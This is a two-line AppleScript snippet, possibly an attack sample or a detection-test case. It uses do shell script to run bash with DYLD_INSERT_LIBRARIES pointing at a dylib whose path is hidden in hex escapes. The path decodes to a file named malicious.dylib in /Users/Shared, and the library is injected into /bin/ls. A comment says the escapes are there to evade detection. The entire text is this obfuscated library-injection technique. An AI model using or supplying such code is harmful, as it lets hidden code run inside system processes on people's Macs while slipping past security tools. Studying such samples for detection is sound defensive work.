-- Builds path using ASCII hex escapes to evade detection
do shell script "bash -c $'DYLD_INSERT_LIBRARIES=\\x2F\\x55\\x73\\x65\\x72\\x73\\x2F\\x53\\x68\\x61\\x72\\x65\\x64\\x2F\\x6D\\x61\\x6C\\x69\\x63\\x69\\x6F\\x75\\x73\\x2E\\x64\\x79\\x6C\\x69\\x62 /bin/ls'"
